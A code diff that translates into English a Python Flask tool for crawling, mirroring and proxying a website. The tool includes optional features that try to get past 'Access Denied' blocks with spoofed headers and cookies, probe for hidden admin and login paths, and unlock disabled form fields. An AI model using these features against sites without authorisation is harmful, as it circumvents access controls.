@@ -11,40 +11,40 @@ from flask import Flask, request, Response, send_file
 from urllib.parse import urljoin, urlparse
 import platform
 
-# Importa lib Windows para tratar caminhos longos e inválidos
+# Import Windows lib to handle long and invalid paths
 try:
-    from lib_windows_eng import safe_path, remove_long_path_prefix, ENABLE_WIN_LIB
-    ENABLE_WIN_LIB()
+    from lib_windows_eng import safe_path, remove_long_path_prefix, enable_windows_lib
+    enable_windows_lib()
 except Exception as e:
-    print(f"[WARN] lib_windows_eng não pôde ser ativada: {e}")
+    print(f"[WARN] lib_windows_eng could not be enabled: {e}")
 
 sys.setrecursionlimit(10000)
 
-# ---------------- CONFIGURAÇÃO GLOBAL ----------------
+# ---------------- GLOBAL CONFIGURATION ----------------
 
 MODE = "AUTO_MODE"
-SITE_URL = "https://discord.com"
+SITE_URL = "https://google.cat"
 PORT = 80
 
-FORCE_ACCESS_DENIED_BYPASS = False  # Ativa táticas para evitar bloqueios Access Denied
-SCAN_FOR_HIDDEN_PATHS = False       # Ativa busca por URLs ocultas (admin, login etc)
-ENABLE_HIDDEN_ELEMENTS = False      # Durante crawling, habilita elementos ocultos no HTML
-SHOW_HIDDEN_ELEMENTS = False        # Durante resposta HTTP, exibe elementos ocultos
-ENABLE_CRAWLING = True              # Ativa crawler automático
+FORCE_ACCESS_DENIED_BYPASS = False  # Enable tactics to avoid Access Denied blocks
+SCAN_FOR_HIDDEN_PATHS = False       # Enable search for hidden URLs (admin, login, etc)
+ENABLE_HIDDEN_ELEMENTS = False      # During crawling, enable hidden elements in HTML
+SHOW_HIDDEN_ELEMENTS = False        # During HTTP response, show hidden elements
+ENABLE_CRAWLING = True              # Enable automatic crawler
 HEADER_DEVICE = "desktop"           # desktop, mobile, tablet, bot, auto
-ACCEPT_ALL_MIRRORS_REQUEST = True  # Aceita baixar mirrors automaticamente
+ACCEPT_ALL_MIRRORS = True           # Automatically accept downloading mirrors
 
-# ----------- Variáveis internas -------------
+# ----------- Internal variables -------------
 visited = set()
 MAX_VISITED = 1000
 app = Flask(__name__, static_folder=None)
 
-# Define paths para salvar arquivos localmente
+# Define paths to save files locally
 SITE_NAME = urlparse(SITE_URL).netloc.replace("www.", "").replace(".", "_")
 SITE_SRC = os.path.join("site_src", f"{SITE_NAME}_{HEADER_DEVICE}")
 SITE_DATA = os.path.join("site_data", f"{SITE_NAME}_{HEADER_DEVICE}")
 
-# ---------- Funções utilitárias -------------
+# ---------- Utility functions -------------
 
 def detect_device():
     if HEADER_DEVICE != "auto":
@@ -84,7 +84,7 @@ def get_headers_for_device(device):
     return base_headers.get(device, base_headers["desktop"])
 
 def local_path(url):
-    """Caminho seguro com prefixo para ler/gravar arquivo localmente"""
+    """Safe path with prefix for reading/writing local files"""
     p = urlparse(url)
     path = p.path
     if path.endswith("/"):
@@ -95,7 +95,7 @@ def local_path(url):
     return safe_path(full_path)
 
 def local_path_for_flask(url):
-    """Caminho sem prefixo para enviar arquivo via Flask"""
+    """Path without prefix for sending files via Flask"""
     p = urlparse(url)
     path = p.path
     if path.endswith("/"):
@@ -108,11 +108,13 @@ def try_decompress(r):
     content = r.content
     encoding = r.headers.get("Content-Encoding", "")
     if "br" in encoding:
-        try: return brotli.decompress(content)
+        try:
+            return brotli.decompress(content)
         except Exception as e:
             print(f"[WARN] Brotli decompress failed: {e}")
     if "gzip" in encoding:
-        try: return gzip.decompress(content)
+        try:
+            return gzip.decompress(content)
         except Exception as e:
             print(f"[WARN] Gzip decompress failed: {e}")
     return content
@@ -128,13 +130,13 @@ def save_content(url, content):
     return path
 
 def modify_html_for_visibility(soup):
-    """Remove ocultação CSS e atributos de elementos para mostrar conteúdos escondidos"""
+    """Removes CSS hiding and attributes to show hidden content"""
     for el in soup.select("[style*='display:none'], [style*='visibility:hidden'], [style*='opacity:0']"):
         el['style'] = "display:block !important; visibility:visible !important; opacity:1 !important; background:yellow; border:2px dashed red;"
     for attr in ["hidden", "disabled", "readonly"]:
         for el in soup.select(f"[{attr}]"):
             del el[attr]
-    # Converte atributos data-href para href para tornar clicáveis
+    # Convert data-href attributes to href to make clickable
     for el in soup.find_all(attrs={"data-href": True}):
         el.name = "a"
         el["href"] = el["data-href"]
@@ -147,19 +149,19 @@ def is_valid_url(url):
 # ---------------- Mirror Handling -----------------
 
 def ask_user_about_mirror(filename, mirrorurl):
-    global ACCEPT_ALL_MIRRORS_REQUEST
-    if ACCEPT_ALL_MIRRORS_REQUEST:
+    global ACCEPT_ALL_MIRRORS
+    if ACCEPT_ALL_MIRRORS:
         return True
-    print(f"\nMirror detectado: {mirrorurl}\nArquivo: {filename}")
-    print("[S] Sim   [N] Não   [A] Aceitar todos")
+    print(f"\nMirror detected: {mirrorurl}\nFile: {filename}")
+    print("[Y] Yes   [N] No   [A] Accept all")
     while True:
-        choice = input("Sua escolha (S/N/A): ").strip().lower()
-        if choice == "s":
+        choice = input("Your choice (Y/N/A): ").strip().lower()
+        if choice == "y":
             return True
         elif choice == "n":
             return False
         elif choice == "a":
-            ACCEPT_ALL_MIRRORS_REQUEST = True
+            ACCEPT_ALL_MIRRORS = True
             return True
 
 def check_and_download_mirror(url):
@@ -175,7 +177,7 @@ def download(url):
     device = detect_device()
     headers = get_headers_for_device(device)
 
-    # Bypass Access Denied (exemplo simples)
+    # Bypass Access Denied (simple example)
     if FORCE_ACCESS_DENIED_BYPASS:
         headers["Referer"] = SITE_URL
         headers["Cookie"] = "security_bypass=true"
@@ -187,7 +189,7 @@ def download(url):
         content = try_decompress(r)
         return save_content(url, content)
     except Exception as e:
-        print(f"[ERRO] {url}: {e}")
+        print(f"[ERROR] {url}: {e}")
         return None
 
 def is_html(content):
@@ -197,7 +199,7 @@ def is_html(content):
 def crawl(url):
     global visited
     if len(visited) >= MAX_VISITED:
-        print("[AVISO] Limite máximo de URLs visitadas atingido")
+        print("[WARNING] Maximum number of visited URLs reached")
         return
     if url in visited:
         return
@@ -219,7 +221,7 @@ def crawl(url):
         with open(saved_path, "w", encoding="utf-8") as f:
             f.write(str(soup))
 
-    # Busca links para crawling
+    # Search links for crawling
     tags_attrs = {
         "script": "src",
         "link": "href",
@@ -240,7 +242,7 @@ def crawl(url):
                 else:
                     check_and_download_mirror(full_url)
 
-    # Busca links <a href> internos
+    # Search internal <a href> links
     for a in soup.find_all("a", href=True):
         link = urljoin(url, a["href"])
         if link.startswith(SITE_URL):
@@ -254,7 +256,7 @@ def crawl(url):
             try:
                 r = requests.get(hp_url, headers=get_headers_for_device(detect_device()), timeout=10)
                 if r.status_code == 200 and is_html(r.content):
-                    print(f"[OCULTO] {hp_url}")
+                    print(f"[HIDDEN] {hp_url}")
                     crawl(hp_url)
             except:
                 pass
@@ -281,12 +283,12 @@ def proxy(path):
             r = requests.post(target, data=data, headers=request.headers)
             return Response(r.content, status=r.status_code, content_type=r.headers.get("Content-Type"))
         except Exception as e:
-            return Response(f"Erro: {e}", status=502)
+            return Response(f"Error: {e}", status=502)
 
     if os.path.exists(local_internal):
         mime = mimetypes.guess_type(local_flask)[0] or "application/octet-stream"
         if SHOW_HIDDEN_ELEMENTS:
-            # Lê e modifica conteúdo para mostrar elementos ocultos na resposta
+            # Reads and modifies content to show hidden elements in the response
             with open(local_internal, "r", encoding="utf-8", errors="ignore") as f:
                 html = f.read()
             soup = BeautifulSoup(html, "html.parser")
@@ -295,7 +297,7 @@ def proxy(path):
         else:
             return send_file(local_flask, mimetype=mime, conditional=True)
 
-    # Se arquivo não existe localmente, busca online e salva
+    # If file doesn't exist locally, fetch online and save
     try:
         headers = get_headers_for_device(detect_device())
         if FORCE_ACCESS_DENIED_BYPASS:
@@ -309,7 +311,7 @@ def proxy(path):
             f.write(content)
         return Response(content, status=r.status_code, content_type=r.headers.get("Content-Type"))
     except Exception as e:
-        return Response(f"Erro remoto: {e}", status=500)
+        return Response(f"Remote error: {e}", status=500)
 
 # -------------------- MAIN ----------------------------
 
@@ -317,11 +319,11 @@ if __name__ == "__main__":
     os.makedirs(SITE_SRC, exist_ok=True)
     os.makedirs(SITE_DATA, exist_ok=True)
     if ENABLE_CRAWLING:
-        print(f"Iniciando crawling do site: {SITE_URL} (modo: {MODE})")
+        print(f"Starting crawling of site: {SITE_URL} (mode: {MODE})")
         crawl(SITE_URL)
     else:
-        print("Crawling desativado.")
-    print(f"Arquivos salvos em: {os.path.abspath(SITE_SRC)}")
-    print(f"POSTs salvos em: {os.path.abspath(SITE_DATA)}")
-    print(f"Servidor rodando em: http://127.0.0.1:{PORT}")
+        print("Crawling disabled.")
+    print(f"Files saved at: {os.path.abspath(SITE_SRC)}")
+    print(f"POSTs saved at: {os.path.abspath(SITE_DATA)}")
+    print(f"Server running at: http://127.0.0.1:{PORT}")
     app.run(host="0.0.0.0", port=PORT)
